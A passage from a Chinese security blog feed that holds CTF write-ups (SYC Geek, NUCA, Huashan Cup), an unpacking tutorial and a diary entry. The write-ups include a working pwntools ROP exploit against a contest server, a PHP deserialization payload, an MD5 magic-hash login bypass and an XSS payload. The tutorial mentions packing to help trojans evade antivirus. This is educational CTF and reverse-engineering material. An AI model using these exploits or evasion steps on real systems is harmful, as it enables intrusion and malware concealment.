        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>   毕竟我不是搞web的，所以本文主要写的内容，主要是写二进制的，但是我也不是搞移动端和安卓的，所以我本篇文章的内容主要是reverse和pwn。<br>​    其次呢，因为笔者能力有限，所以如果有哪个地方写错了，或者写得不好，欢迎大家指出，谢谢。</p><p>比赛地址：<a href="http://geek.sycsec.com/">http://geek.sycsec.com/</a><br>​    还有一点就是，这个比赛是成信三叶草准备招新的题目，所以很多地方都是挺适合入门者学习的，所以大神就别来看了。<br>二进制题目打包[下载</p><p>](<a href="http://pan.baidu.com/s/1nuJ1cDF">http://pan.baidu.com/s/1nuJ1cDF</a>)<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/base.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/base.png"></a></p><h1 id="Ernie"><a href="#Ernie" class="headerlink" title="Ernie"></a>Ernie</h1><p>这个题目挺有意思的<br>主要看的是名字的name的长度，幸运数字，以及Key的值</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-sycgeek-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-sycgeek-01.jpg"></a><br>（运行截图）</p><p>贴出关键代码</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key_1.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key_1.png"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key_2.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key_2.png"></a></p><p>这个题目逻辑还是挺清晰的，name是6位，key应该是16进制，也就是说2位转化成一个字符给S1，key本来应该是32位，那么S1将是16位</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key3.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key3.png"></a></p><p>而这一段则说明了S1要与这里的红框的字符串相同，字符串是a_6sy2tcy3iy7se，所以输入的key应该就S1的16进制咯，<br>继续往下看</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key4.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key4.png"></a></p><p>先进入 sub_8048717的函数看一眼</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-8048717.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-8048717.png"></a></p><p>现在已知v6==6，这里不能让j小于0，所以反过来想，j只能为6，如果j小于6那么肯定就会小于0，就不对了。flag出不来了，所以j初始值是大于6的，到6停止，为达到停止条件，v3为6.<br>继续往下看，将s1与v3异或，然后转化成字符串，之后就得到flag了。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-result.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-result.png"></a></p><h1 id="re100小透明"><a href="#re100小透明" class="headerlink" title="re100小透明"></a>re100小透明</h1><p>拿到文件  查壳，没有<br>打开程序</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-keygenme.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-keygenme.png"></a></p><p>这看着像一个keygenme，问题来了帐号和密码是什么呢</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-touming.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-touming.png"></a></p><p>这是关键代码，这里的逻辑是username和password的逻辑<br>，满足的逻辑是这样的：</p><p>usrname = ‘xxxxx’<br>buf = [11,70,23,32,32,61,17,44]</p><p>则key满足，ord(userame[i])-buf[i] = ord(key[i])<br>问题是这里我并不知道用户名什么，题目也没要求给，我看到程序的窗口有个Syclover，那么假定这是一个关于Syclover的keygenme的问题，尝试得到这个用户名的key</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key_of_xiaotuoming.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key_of_xiaotuoming.png"></a></p><p>尝试提交，getflag<br>SYC{H3LLOCTF}</p><h1 id="Re100-HelloWorld"><a href="#Re100-HelloWorld" class="headerlink" title="Re100-HelloWorld"></a>Re100-HelloWorld</h1><p>这题就只是一个字符串比较<br>给新手一个技巧，在IDA中shift+F12可以搜索字符串</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-hello_world.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-hello_world.png"></a></p><p>可以看到几个关键字符串，不知道为什么please input your name的字符串进去之后找不到关键，我索性单机“please input your PassWord”，<br>这里还有一个技巧，将鼠标放到关键地方，按‘X’键可以查看交叉引用</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-X_of_hello.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-X_of_hello.png"></a><br>点击OK</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-cmp_hello.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-cmp_hello.png"></a></p><p>看到了这里有按位进行的字符串比较，但是这里只能看到ascii码不知道，所对应的字符是什么，这里还有一个技巧，是IDA的R键，可以将16进制转成字符</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-resula_of_hello.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-resula_of_hello.png"></a></p><p>所以最后的结果是 SYC{Hell0_W0rld}</p><h1 id="re50-送福利拉"><a href="#re50-送福利拉" class="headerlink" title="re50-送福利拉"></a>re50-送福利拉</h1><p>这题是一个有多解的题目。。。很尴尬阿<br>打开OD去跟，<br>是一个立即数的比较</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-righti-num.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-righti-num.jpg"></a></p><p>找到这个call，F7跟进去</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-re50.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-re50.jpg"></a></p><p>几个比较都是上面的语句，其中ss:[ebp+eax-0x40]，只有eax的值是变化的，eax又是取出我们的输入，所以调整我们的输入，就可以控制byte ptr ss:[ebp+eax-0x40]的值，使跳转条件不成立。这几个比较中，是分别与2、8、9、3、9、8、9、8，然而是栈中有这几个数的地方，就是上面提到的两串立即数。所以要调整输入，使ss:[ebp+eax-0x40]的值分别为2,8,9,3,9,8,9，8的栈地址。<br>所以只要控制我的输入，到和几个立即数相符就好了，我这里得到的是 20161010<br>所以我这的flag是 SYC[20161010]</p><h1 id="Re200-你们要的极乐净土"><a href="#Re200-你们要的极乐净土" class="headerlink" title="Re200-你们要的极乐净土"></a>Re200-你们要的极乐净土</h1><p>听了极乐净土根本停！不！下！来！ 听说只要绕过这些弹出的对话框就可以得到flag了，完全不用逆向哦。 have fun :)  提示：inline hook</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-jljt.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-jljt.png"></a></p><p>这个题目音乐太好好听了，我都舍不得停下来了。恶心的是这弹窗好可怕，还好的是题目说了，弹窗没了，flag就出来了，这不就是咱们经常遇到的去广告，去弹窗的问题吗。<br>用OD加载，<br>以为去窗口我直接，Ctrl+G，找到我要去的API</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-messagebox.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-messagebox.png"></a></p><p>点击确定，<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-breakpoint.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-breakpoint.png"></a></p><p>在这个地方下段，并且将push ebp改成ret 直接让他返回</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-final_jileshijie.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-final_jileshijie.png"></a></p><p>F9运行到断点，输入flag，等待几秒钟加密后的flag就出来了所以这里的flag是<br>SYC{F6A9D22C3018693B2FCC1B2D357F7AEAc}</p><h1 id="pwn200-Rop-rop-rop"><a href="#pwn200-Rop-rop-rop" class="headerlink" title="pwn200-Rop-rop-rop"></a>pwn200-Rop-rop-rop</h1><p>听说真正的魔法师都会rop，你是他的粉丝吗？<a href="https://pan.baidu.com/s/1o8Tipw2">https://pan.baidu.com/s/1o8Tipw2</a> nc 222.18.158.228 12341 （pwn的题目有加分哦，此题解出得400分）</p><p>最后是一个pwn的题目，毕竟是给新人做的，这个题目还是满友善的，step都告诉我们了，先用IDA打开。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/syc-16-overflow.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/syc-16-overflow.png"></a></p><p>这里的关键是怎么绕过if ( strlen(p) &gt; 7 )的判断，我选择用<br>\x00进行截断。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-rop_step.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-rop_step.png"></a></p><p>题目还给了不少提示，题目的名字和这里都很明显的告诉我们要有三个的rop，那就顺着题目的意思来吧，这里进行构造payload，<br>rop链还要符合step1-3的check</p><p>看一下step3的伪代码</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-step3.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-step3.png"></a></p><p>题目也给我们提供了一个cmd这还是蛮友好的。。。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-step3_1111.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-step3_1111.png"></a><br>所以最后的exp已经很好写了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;222.18.158.228&quot;</span>,<span class="number">12341</span>)</span><br><span class="line"><span class="comment"># print r.recvuntil(&quot;Input&quot;)</span></span><br><span class="line"></span><br><span class="line">step1Addr = <span class="number">0x0804871e</span></span><br><span class="line">step2Addr = <span class="number">0x08048766</span></span><br><span class="line">step3Addr = <span class="number">0x080487a3</span></span><br><span class="line">mainAddr = <span class="number">0x0804867d</span></span><br><span class="line"></span><br><span class="line">shellcodeBuf = <span class="string">&#x27;a&#x27;</span>*<span class="number">7</span> + chr(<span class="number">0</span>) * <span class="number">9</span></span><br><span class="line"></span><br><span class="line">payload1 = shellcodeBuf + p32(step1Addr) + p32(mainAddr) + p32(<span class="number">0</span>) + p32(<span class="number">0x41414141</span>) + <span class="string">&#x27;\xd5\xc4\xb3\xa2&#x27;</span></span><br><span class="line"></span><br><span class="line">payload2 = shellcodeBuf + p32(step2Addr) + p32(mainAddr) + p32(<span class="number">0xff25a7d4</span>)+ p32(<span class="number">0x41414141</span>)</span><br><span class="line"></span><br><span class="line">payload3 = shellcodeBuf + p32(step3Addr) + p32(mainAddr) + p32(<span class="number">0xffffffff</span>) + p32(<span class="number">0xc0c0c0c</span>) + p32(<span class="number">0x9a829a82</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.sendline(payload3)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-attachk.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-attachk.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> sycsec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NUCA 的部分pwn-2016</title>
      <link href="2016-NUCA-pwn-Writeup.html"/>
      <url>2016-NUCA-pwn-Writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>一直没敢做的pwn  今天NUCA把题重新放了出来</p><p>事后发现其实挺简单</p><h1 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h1><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/3620347.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/3620347.jpg"></a></p><p>将我们输入的密码进行了base64编码</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/46920513.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/46920513.jpg"></a></p><p>然后打开password.txt<br>在主函数有一个很重要的地方<br>就是如果staus==Y 那么会读取flag的内容<br>问题来怎么样staus才会等于<code>Y</code><br>从伪代码中我们知道  <code>!verify()</code>的时候我们才能得到flag</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/83392328.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/83392328.jpg"></a></p><p>看看相关函数<br>只要编码后的结果覆盖后面的标志位为Y即可，所以发送一堆X就可获得flag</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nuca </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向学习——脱壳方法</title>
      <link href="The_hulling_method.html"/>
      <url>The_hulling_method.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="什么是壳"><a href="#什么是壳" class="headerlink" title="什么是壳"></a>什么是壳</h1><p>大家应该先明白“壳”的概念。在自然界中，我想大家对”壳”这东西应该都不会陌生了，植物用它来保护种子，动物用它来保护身体等等。同样，在一些计算机软件里也有一段专门负责保护软件不被非法修改或反编译的程序。它们一般都是先于程序运行，拿到控制权，然后完成它们保护软件的任务。就像动植物的壳一般都是在身体外面一样理所当然（当然后来也出现了所谓的“壳中带籽”的壳）。由于这段程序和自然界的壳在功能上有很多相同的地方，基于命名的规则，大家就把这样的程序称为“壳”了。就像计算机病毒和自然界的病毒一样，其实都是命名上的方法罢了。</p><h1 id="壳的作用"><a href="#壳的作用" class="headerlink" title="壳的作用"></a>壳的作用</h1><p>1 写好一个程序后，不想让别人随便更改其中的版权信息，我们可以加壳对其进行保护防止被修改。<br>2 可以利用压缩壳减少程序容量，方便程序传播。<br>3 帮助木马病毒进行免杀，我们可以直接加壳免杀，也可以脱壳对其代码进行修改从而躲过杀毒软件的查杀。</p><h1 id="脱壳的基础知识"><a href="#脱壳的基础知识" class="headerlink" title="脱壳的基础知识"></a>脱壳的基础知识</h1><h2 id="1壳是怎么装载的？"><a href="#1壳是怎么装载的？" class="headerlink" title="1壳是怎么装载的？"></a>1壳是怎么装载的？</h2><p>   壳自从加到程序上以后就连在一起了，即对程序进行保护，防止被修改，也就是壳把程序给包裹起来了，而且原程序的数据也被压缩了。<br>    装载的时候通常是先执行壳后再跳到真正的原程序OEP（程序入口点），这时开始运行原先没加壳的程序。<br>运行顺序：执行带壳文件——执行壳——执行到程序入口点——运行未加壳的程序。</p><h2 id="壳的分类"><a href="#壳的分类" class="headerlink" title="壳的分类"></a>壳的分类</h2><p>壳出于程序作者想对程序资源压缩、注册保护的目的，壳一般分为压缩壳和加密壳两类。<br>压缩壳：一般只对文件进行压缩处理，既压缩区段和一些资源压缩，以减少文件体积为目的<br>如：ASPack、UPX、PECompact等<br>加密壳：跟压缩壳正好相反，一般是牺牲减少体积为代价，对文件进行加密处理，用上各种反跟踪技术保护程序不被调试、脱壳，<br>如：ASProtect、Armadillo、EXECryptor等<br>但随着加壳技术的发展，这两类壳之间的界限越来越模糊，很多加壳软件既有压缩功能也有保护性能，而且现在很多加密壳达到壳中带肉，肉中带壳的地步了。</p><h2 id="OEP-（程序入口点）"><a href="#OEP-（程序入口点）" class="headerlink" title="OEP （程序入口点）"></a>OEP （程序入口点）</h2><p>   OEP：Original Entry Point ，程序加壳前真正的入口点。</p><h2 id="脱壳的基本步骤"><a href="#脱壳的基本步骤" class="headerlink" title="脱壳的基本步骤"></a>脱壳的基本步骤</h2><p>查壳(PEID、FI、PE-SCAN)—&gt;寻找OEP(OD)—&gt;脱壳/Dump(LordPE、PeDumper、OD自带的脱壳插件、PETools)—&gt;修复(Import REConstructor)</p><h1 id="常用脱壳方法"><a href="#常用脱壳方法" class="headerlink" title="常用脱壳方法"></a>常用脱壳方法</h1><h2 id="单步跟踪法"><a href="#单步跟踪法" class="headerlink" title="单步跟踪法"></a>单步跟踪法</h2><p>（1）用OD载入，点“不分析代码”<br>（2）.单步向下跟踪F8，实现向下的跳。也就是说向上的跳不让其实现（通过F4）<br>（3）遇到程序往回跳的（包括循环），我们在下一句代码处按F4（或者右健单击代码，选                     择断点——&gt;运行到所选）<br>（4）绿色线条表示跳转没实现，不用理会，红色线条表示跳转已经实现<br>（5）如果刚载入程序，在附近就有一个CALL的，我们就F7跟进去，不然程序很容易跑  飞，这样很快就能到程序的OEP<br>（6）在跟踪的时候，如果运行到某个CALL程序就运行的，就在这个CALL中F7进入<br>（7）一般有很大的跳转（大跨段），比如 jmp XXXXXX 或者 JE XXXXXX 或者有RETN  的一般很快就会到程序的OEP<br>注：在有些壳无法向下跟踪的时候，我们可以在附近找到没有实现的大跳转，右键–&gt;“跟随”,然后F2下断，Shift+F9运行停在“跟随”的位置，再取消断点，继续F8单步跟踪。一般情况下可以轻松到达OEP</p><h2 id="ESP定律法"><a href="#ESP定律法" class="headerlink" title="ESP定律法"></a>ESP定律法</h2><p>   ESP定理脱壳（ESP在OD的寄存器中，我们只要在命令行下ESP的硬件访问断点，就会一下来到程序的OEP了！）<br>（1）开始就点F8，注意观察OD右上角的寄存器中ESP有没突现（变成红色）（这只是一  般情况下，更确切的说我们选择的ESP值是关键句之后的第一个ESP值）<br>（2）在命令行下：dd XXXXXXXX(指在当前代码中的ESP地址，或者是hr XXXXXXXX)，  按回车<br>（3）选中下断的地址，断点—&gt;硬件访—&gt;WORD断点<br>（4）按一下F9运行程序，直接来到了跳转处，按下F8，到达程序OEP</p><h2 id="内存镜像法"><a href="#内存镜像法" class="headerlink" title="内存镜像法"></a>内存镜像法</h2><p>（1）用OD打开软件<br>（2）点击选项——调试选项——异常，把里面的忽略全部√上。CTRL+F2重载下程序<br>（3）按ALT+M,打开内存镜象，找到程序的第一个.rsrc.按F2下断点，然后按SHIFT+F9运  行到断点，接着再按ALT+M,打开内存镜象，找到程序的第一个.rsrc.上面的.CODE（也  就是00401000处），按F2下断点。然后按SHIFT+F9（或者是在没异常情况下按F9），  直接到达程序OEP</p><h2 id="一步到达OEP"><a href="#一步到达OEP" class="headerlink" title="一步到达OEP"></a>一步到达OEP</h2><p>（1）开始按Ctrl+F,输入：popad（只适合少数壳，包括UPX，ASPACK壳），然后按下F2，  F9运行到此处<br>（2）来到大跳转处，点下F8，到达OEP</p><h2 id="最后一次异常法"><a href="#最后一次异常法" class="headerlink" title="最后一次异常法"></a>最后一次异常法</h2><p>（1）用OD打开软件<br>（2）点击选项——调试选项——异常，把里面的√全部去掉！CTRL+F2重载下程序<br>（3）一开始程序就是一个跳转，在这里我们按SHIFT+F9，直到程序运行，记下从开始按SHIFT+F9到程序运行的次数m<br>（4）CTRL+F2重载程序，按SHIFT+F9（这次按的次数为程序运行的次数m-1次）<br>（5）在OD的右下角我们看见有一个”SE 句柄”，这时我们按CTRL+G，输入SE 句柄前的地址<br>（6）按F2下断点，然后按SHIFT+F9来到断点处<br>（7）去掉断点，按F8慢慢向下走<br>（8）到达程序的OEP</p><h2 id="模拟跟踪法"><a href="#模拟跟踪法" class="headerlink" title="模拟跟踪法"></a>模拟跟踪法</h2><p>（1）先试运行，跟踪一下程序，看有没有SEH暗桩之类<br>（2）ALT+M打开内存镜像，找到（包含那一列中出现SFX,imports,relocations或者SFX,输  入表，重定位）<br>（3）若地址为00xxxxxx在命令行下输入tc eip&lt;00xxxxxx，回车，提示正在跟踪</p><h2 id="SFX法"><a href="#SFX法" class="headerlink" title="SFX法"></a>SFX法</h2><p>（1）设置OD，忽略所有异常，也就是说异常选项卡里面都打上勾<br>（2）切换到SFX选项卡，选择“字节模式跟踪实际入口（速度非常慢）”，确定<br>（3）重载程序（如果跳出是否“压缩代码？”选择“否”，OD直接到达OEP）</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有时候想想 是得规划一下自己了</title>
      <link href="tell_myself.html"/>
      <url>tell_myself.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>有时候不知道自己在做什么呢 ，虽然知道自己是要玩<code>Bin</code>的，我也是当这个是自己的爱好甚至是以后自己就想发展这条路了，</p><p>但是越来越觉得自己<strong>辣鸡</strong>阿</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/vegtable-hhh.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/vegtable-hhh.jpg"></a></p><p>一天到晚都不知道在折腾什么</p><p>说学python吧  只会写写小东西  爬虫什么的都不会</p><p>说逆向吧   看看简单的算法还可以  其他的 我就只能说我。。。</p><p>说溢出吧  知道代码哪里有问题 就是不会利用  现在连<strong>shellcode</strong>都不知道怎么用</p><p>大二了</p><p><code> 汪师傅</code>和我说<br>每天折腾点什么  随便折腾  慢慢积累 总会成长的<br>但是。。。还是得有个大方向 告诉自己  今年要干完什么 自己要完成什么嘛</p><p><code>Yllen学长</code>告诉我  你应该有一个计划  是的我应该要有一个计划 至少告诉自己 看完什么书  学好什么  到什么样的境地吧</p><blockquote><p>逆向<br>逆向  hook 调试技术总得解决吧  还有反调试</p><blockquote><p> 溢出<br> 我这学期一定要入门 至少要会写POC吧<br> IDA和OlyDbg得多用用了<br> 还有 那个 0day的书 我得看完吧。。。<br> 还得多接触一下壳呢 </p><p> <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/siwen.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/siwen.jpg"></a><br> 随便折腾 到处折腾 就是折腾。。。233<br> 好好学习天天向上<br> ​       2016-09-18 00:24:26</p></blockquote></blockquote></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2016-中国·西安 华山杯 Writeup-SeeSea</title>
      <link href="2016-Hs-ctf-SeeSea-writeup.html"/>
      <url>2016-Hs-ctf-SeeSea-writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="https://yunpan.cn/ckyrKxHJDPAIN">题目分享</a>（提取码：bbaf）</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="签到-10"><a href="#签到-10" class="headerlink" title="签到(10)"></a>签到(10)</h2><blockquote><p>扫码回复 <code>hs_ctf</code>拿flag,  套路题。<br><code>flag_Xd&#123;hSh_ctf:WelcomeTo2016XiDian&amp;HumenHS&#125;</code></p></blockquote><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/61851063.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/61851063.jpg"></a></p><h2 id="打不过-50"><a href="#打不过-50" class="headerlink" title="打不过~(50)"></a>打不过~(50)</h2><blockquote><p>打不过绕道走~ <a href="http://huashan.xdsec.cn/ctf_hs_00b.php">http://huashan.xdsec.cn/ctf_hs_00b.php</a></p></blockquote><p>直接将submit按钮改成可点击，然后抓包，发现<code>str</code>值为<code>OGM0MzU1NTc3MTdhMTQ4NTc4ZmQ4MjJhYWVmOTYwNzk=</code>，拿出来解base64，然后再解一道md5，得到是<code>1931b</code>，然后提交<code>Password=1931b</code>，得flag:<code>flag_Xd&#123;hSh_ctf:XD_aA@lvmM&#125;</code></p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/93429080.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/93429080.jpg"></a></p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/35641631.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/35641631.jpg"></a></p><h2 id="系统管理-100"><a href="#系统管理-100" class="headerlink" title="系统管理(100)"></a>系统管理(100)</h2><blockquote><p><a href="http://huashan.xdsec.cn/xt">http://huashan.xdsec.cn/xt</a>  账户:admin  密码:admin  请登陆<br>首次发包，返回部分源码，是<code>username</code>的md5值为0，所以令<code>username</code>值为<code>QNKCDZO</code>。</p></blockquote><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/25806101.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/25806101.jpg"></a></p><p>然后返回了<code>user.php</code>，然后对<code>user.php</code>进行发包。看到了新的源码，是一个反序列化漏洞。然后构造<code>password=a:2:&#123;s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;&#125;</code>，向<code>index.php</code>发包。得到flag:<code>flag_Xd&#123;hSh_ctf:kidhvuensl^$&#125;</code>。</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/63995380.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/63995380.jpg"></a></p><h2 id="简单js-100"><a href="#简单js-100" class="headerlink" title="简单js(100)"></a>简单js(100)</h2><blockquote><p>来道js前菜，热身一下吧~  <a href="http://huashan.xdsec.cn/jdjs">http://huashan.xdsec.cn/jdjs</a></p></blockquote><p>进去后不能右键源码，其实各种查看源码的法子，例如火狐f12打开firebug，然后源码里就是简单的js而已</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:08:21%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:08:21%20"></a></p><p>在控制台里运行即可得到key值，submit得到flag。或者干脆直接onclick=”return check();”去掉</p><h2 id="弹弹弹！-150"><a href="#弹弹弹！-150" class="headerlink" title="弹弹弹！(150)"></a>弹弹弹！(150)</h2><blockquote><p>弹出鱼尾纹！~  <a href="http://huashan.xdsec.cn/ctf_hs_00a.php">http://huashan.xdsec.cn/ctf_hs_00a.php</a></p></blockquote><p>很简单的xss，过滤不严，<br><code>&lt;BODY ONLOAD=alert(&#39;XSS&#39;)&gt; 